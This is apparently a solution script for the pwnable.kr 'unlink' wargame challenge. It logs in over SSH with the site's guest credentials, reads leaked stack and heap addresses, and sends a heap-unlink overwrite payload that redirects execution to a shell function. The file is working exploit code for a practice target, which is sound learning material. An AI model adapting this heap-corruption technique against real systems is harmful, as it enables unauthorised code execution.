from pwn import *

context.log_level = "DEBUG"

context.terminal = ['tmux', 'splitw', '-v']

s = ssh(host='pwnable.kr', port=2222, user='unlink', password='guest')
#s.download_file('unlink')
#s.download_file('unlink.c')

p = s.process("./unlink")
#p = process("./unlink")

#p.recvuntil("now that you have leaks, get shell!\n")
data = p.recv()

# shell() 0x080484eb

#void unlink(OBJ *P) {
#OBJ *BK;//A
#OBJ *FD;//C
#BK = P->bk;//shell_addr
#FD = P->fd;//AAAA
#FD->bk = BK;//write_to_addr
#BK->fd = FD;//AAAA
#}

# A
# fd
# bk
# buf   AAAAAAAA.....AAAA
# 
# B
# fd    AAAA
# bk    shell_addr
# buf   AAAAAAA......AAAA
# 
# C 
# fd    got_addr
# bk    AAAA
# buf
#

# 0xffffd4fc:     0x080485f7 unlink ret

stack = int(data.splitlines()[0][-10:], 16)
heap = int(data.splitlines()[1][-10:], 16)

stack_addr = p32(int(data.splitlines()[0][-10:], 16))
heap_addr = p32(int(data.splitlines()[1][-10:], 16))

unlink_ret = stack + 0x10 #0x28 #- 0x18
heap_ptr   = heap + 0x14

shell = 0x080484eb

write_addr = p32(unlink_ret - 0x4)
my_addr = p32(shell)

pad = "A"*8 + my_addr + "A"*4

payload = pad + write_addr + p32(heap_ptr)


#gdb.attach(p, '''
#break *0x08048504
#continue
#''')

p.sendline(payload)

p.recv()
p.interactive()
